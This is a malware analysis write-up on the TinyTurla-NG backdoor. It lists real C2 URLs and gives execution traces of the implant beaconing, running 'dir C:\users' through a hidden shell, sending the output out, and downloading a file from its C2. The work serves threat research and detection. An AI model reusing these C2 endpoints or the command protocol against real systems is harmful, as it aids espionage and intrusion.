SHA256 : 267071DF79927ABD1E57F57106924DD8A68E1C4ED74E7B69403CDCDF6E6A453B  
sample source : https://bazaar.abuse.ch/sample/267071df79927abd1e57f57106924dd8a68e1c4ed74e7b69403cdcdf6e6a453b/  
VT : https://www.virustotal.com/gui/file/267071df79927abd1e57f57106924dd8a68e1c4ed74e7b69403cdcdf6e6a453b  
Report: https://blog.talosintelligence.com/tinyturla-next-generation/  


C2 :  
https://thefinetreats.com/wp-content/themes/twentyseventeen/rss-old.php  
https://hanagram.jp/wp/wp-content/themes/hanagram/rss-old.php  

Analyzed sample is a 64bit Service DLL attributed to TURLA by TALOS and named TinyTurla-NG.

Results are shared in two files :

    logs.txt which contains an execution trace of the malware until it connects to a C2 and execute 2 chosen commands
    conf.txt which contains the configuration used to analyse this sample, notably the list of API call filtered from the logs

**Commentary**

Analysed sample is already well described in the TALOS report so I won't go into details.  
For this analysis, I chose to rebuild a small C2 and order the malware to execute the following commands while supervised :  

- dir C:\users  
- get https://hanagram.jp/hanagram.cert toto.cer  

---

First Beaconing to a reachable C2 :  

```html
[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpConnect> in [WINHTTP.dll] 
[PAR] HINTERNET     hSession       : 0x3e803410
[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A4850
[STR]               -> "hanagram.jp"
[PAR] INTERNET_PORT nServerPort    : 443
[RET] 0x7fff146bbb16 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hConnect          : 0x3f66b470
[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F668
[STR]           -> "POST"
[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F2C6E40
[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
[RET] 0x7fff146bbc26 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpSendRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest         : 0x000000F43F5920B0
[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F2C6E40
[STR]           -> "Content-Type: multipart/form-data; boundary="-""
[PAR] DWORD     dwHeadersLength  : 0xffffffff
[PAR] LPVOID    lpOptional       : 0x0 (null)
[PAR] DWORD     dwOptionalLength : 0x0
[PAR] DWORD     dwTotalLength    : 0xbe
[RET] 0x7fff146bd38b in [tinyturla.dll]

Thread created by monitored process : Now monitoring [pid 0x254][tid 0x2d4]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpWriteData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                 : 0x000000F43F5920B0
[PAR] LPCVOID   lpBuffer                 : 0x000000F43F8AE4C0
[STR]           -> "---"
[STR]              "Content-Disposition: form-data;name="id""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "ea2ced84"
[STR]              "---"
[STR]              "Content-Disposition: form-data;name="result""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "Client Ready" <-- Ready for buisiness>
[STR]              "-----"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0xbe
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F6C0
[RET] 0x7fff146bd3f2 in [tinyturla.dll]
```

As mentionned in the report the first beaconing contains the "Client Ready" message to signal the C2 that the is malware is up and ready to receive orders.  

---  

With the following 'gettask' message, the malware is offering the C2 an opportunity to reply with an order :  

```html
[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpConnect> in [WINHTTP.dll] 
[PAR] HINTERNET     hSession       : 0x3e803dc0
[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A4E50
[STR]               -> "hanagram.jp"
[PAR] INTERNET_PORT nServerPort    : 443
[RET] 0x7fff146bbb16 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hConnect          : 0x3f66aad0
[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F728
[STR]           -> "POST"
[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F3BD070
[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
[RET] 0x7fff146bbc26 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpSendRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest         : 0x000000F43F370140
[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F3BC580
[STR]           -> "Content-Type: multipart/form-data; boundary="-""
[PAR] DWORD     dwHeadersLength  : 0xffffffff
[PAR] LPVOID    lpOptional       : 0x0 (null)
[PAR] DWORD     dwOptionalLength : 0x0
[PAR] DWORD     dwTotalLength    : 0xaf
[RET] 0x7fff146bd38b in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpWriteData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                 : 0x000000F43F370140
[PAR] LPCVOID   lpBuffer                 : 0x000000F43E806620
[STR]           -> "---"
[STR]              "Content-Disposition: form-data;name="id""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "ea2ced84"
[STR]              "---"
[STR]              "Content-Disposition: form-data;name="gettask"" <-- your wish is my command>
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "-----"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0xaf
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F780
[RET] 0x7fff146bd3f2 in [tinyturla.dll]
```
---  

First command :  

I've chosen to make the malware execute the following command : 'rsp: dir c:\users'   
Which triggered the following behavior :  

Note thet thread executing the command **[tid 0x968]** is not the one sending the result back to the C2 **[tid 0x664]**  

```html
[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
[API] <CreateProcessA> in [KERNEL32.DLL] 
[PAR] LPCTSTR               lpApplicationName    : 0x0 (null)
[PAR] LPCTSTR               lpCommandLine        : 0x00007FFF146E0888
[STR]                       -> "C:\Windows\System32\cmd.exe"
[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes  : 0x0
[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes   : 0x0
[PAR] BOOL                  bInheritHandles      : 0x1
[PAR] DWORD                 dwCreationFlags      : 0x8000000 (CREATE_NO_WINDOW)
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCSTR                lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOA        lpStartupInfo        : 0x000000F4405DF820
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x000000F4405DF800
[RET] 0x7fff146b46b0 in [tinyturla.dll]

[...]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpConnect> in [WINHTTP.dll] 
[PAR] HINTERNET     hSession       : 0x3e803410
[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A52A0
[STR]               -> "hanagram.jp"
[PAR] INTERNET_PORT nServerPort    : 443
[RET] 0x7fff146bbb16 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hConnect          : 0x3f66ac30
[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F748
[STR]           -> "POST"
[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F3BC580
[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
[RET] 0x7fff146bbc26 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpSendRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest         : 0x000000F43F66A450
[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F3BD1C0
[STR]           -> "Content-Type: multipart/form-data; boundary="-""
[PAR] DWORD     dwHeadersLength  : 0xffffffff
[PAR] LPVOID    lpOptional       : 0x0 (null)
[PAR] DWORD     dwOptionalLength : 0x0
[PAR] DWORD     dwTotalLength    : 0x2fc
[RET] 0x7fff146bd38b in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpWriteData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
[PAR] LPCVOID   lpBuffer                 : 0x000000F43F892EB0
[STR]           -> "---"
[STR]              "Content-Disposition: form-data;name="id""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "ea2ced84"
[STR]              "---"
[STR]              "Content-Disposition: form-data;name="result""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              ""
[STR]              "Microsoft Windows [version 6.3.9600]"
[STR]              "(c) 2013 Microsoft Corporation. Tous droits r‚serv‚s."
[STR]              ""
[STR]              "C:\Windows\system32>chcp 437 > NUL"    <--- US CodePage>
[STR]              ""
[STR]              "C:\Windows\system32>dir c:\users"       <--- Command sent>
[STR]              " Le volume dans le lecteur C n'a pas de nom."
[STR]              " Le num‚ro de s‚rie du volume est 689B-5BB9"
[STR]              ""
[STR]              " R‚pertoire de c:\users"
[STR]              ""
[STR]              "21/10/2024  23:42    <DIR>          ."
[STR]              "21/10/2024  23:42    <DIR>          .."
[STR]              "22/08/2013  16:36    <DIR>          Public"
[STR]              "27/02/2025  04:09    <DIR>          user"
[STR]              "               0 fichier(s)                0 octets"
[STR]              "               4 R‚p(s)  47ÿ927ÿ406ÿ592 octets libres"
[STR]              ""
[STR]              "C:\Windows\system32>exit"
[STR]              ""
[STR]              "-----"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x2fc
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F7A0
[RET] 0x7fff146bd3f2 in [tinyturla.dll]

```

As you can see, the malware is forcing the code page 437 (suitable for English / German / Swedish) to be used even though my system is in french.  

---  

Second command :  

I've chosen to make the malware download and save a random file from the C2 (here a certificate) through the following order :  

get https://hanagram.jp/hanagram.cert toto.cer  

which triggered the following behavior :  

```html
[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
[API] <WinHttpConnect> in [WINHTTP.dll] 
[PAR] HINTERNET     hSession       : 0x3e803600
[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A53F0
[STR]               -> "hanagram.jp"
[PAR] INTERNET_PORT nServerPort    : 443
[RET] 0x7fff146bbb16 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hConnect          : 0x3f66ad90
[PAR] LPCWSTR   pwszVerb          : 0x000000F4405DF5E8
[STR]           -> "GET"
[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F8A5090
[STR]           -> "/hanagram.cert"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
[RET] 0x7fff146bbc26 in [tinyturla.dll]

[...]

[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
[API] <CreateFileA> in [KERNEL32.DLL] 
[PAR] LPCTSTR lpFileName            : 0x000000F43F3BCD30
[STR]         -> "toto.cer"
[PAR] DWORD   dwDesiredAccess       : 0x40000000 (GENERIC_WRITE)
[PAR] DWORD   dwCreationDisposition : 0x2 (CREATE_ALWAYS)
[RET] 0x7fff146b6a18 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
[EVT] [Kernel Monitoring]
[MSG] [FILE_CREATED] [toto.cer]

[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE hFile                 : 0x47c
[PAR] LPVOID lpBuffer              : 0x000000F43F2D7AD0
[PAR] DWORD  nNumberOfBytesToWrite : 0x505
[RET] 0x7fff146b6a45 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x968] c:\windows\system32\svchost.exe
[API] <CloseHandle> in [KERNEL32.DLL] 
[PAR] HANDLE hObject    : 0x47c
[RET] 0x7fff146b6abf in [tinyturla.dll]
```

Once the file download succesfuly, the malware reports back to the C2 :  

```html
[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpConnect> in [WINHTTP.dll] 
[PAR] HINTERNET     hSession       : 0x3e803410
[PAR] LPCWSTR       pswzServerName : 0x000000F43F8A5180
[STR]               -> "hanagram.jp"
[PAR] INTERNET_PORT nServerPort    : 443
[RET] 0x7fff146bbb16 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpOpenRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hConnect          : 0x3f66b470
[PAR] LPCWSTR   pwszVerb          : 0x000000F44055F748
[STR]           -> "POST"
[PAR] LPCWSTR   pwszObjectName    : 0x000000F43F2C6F90
[STR]           -> "/wp/wp-content/themes/hanagram/rss-old.php"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x800100 (WINHTTP_FLAG_SECURE | WINHTTP_FLAG_BYPASS_PROXY_CACHE)
[RET] 0x7fff146bbc26 in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpSendRequest> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest         : 0x000000F43F66A450
[PAR] LPCWSTR   pwszHeaders      : 0x000000F43F2C6F90
[STR]           -> "Content-Type: multipart/form-data; boundary="-""
[PAR] DWORD     dwHeadersLength  : 0xffffffff
[PAR] LPVOID    lpOptional       : 0x0 (null)
[PAR] DWORD     dwOptionalLength : 0x0
[PAR] DWORD     dwTotalLength    : 0xfa
[RET] 0x7fff146bd38b in [tinyturla.dll]

[ * ] [pid 0x254][tid 0x664] c:\windows\system32\svchost.exe
[API] <WinHttpWriteData> in [WINHTTP.dll] 
[PAR] HINTERNET hRequest                 : 0x000000F43F66A450
[PAR] LPCVOID   lpBuffer                 : 0x000000F43F897BF0
[STR]           -> "---"
[STR]              "Content-Disposition: form-data;name="id""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "ea2ced84"
[STR]              "---"
[STR]              "Content-Disposition: form-data;name="result""
[STR]              "Content-Type: text/plain"
[STR]              ""
[STR]              "[+] File https://hanagram.jp/hanagram.cert loaded and saved in toto.cer" <--- success>
[STR]              ""
[STR]              "-----"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0xfa
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000F44055F7A0
[RET] 0x7fff146bd3f2 in [tinyturla.dll]
```


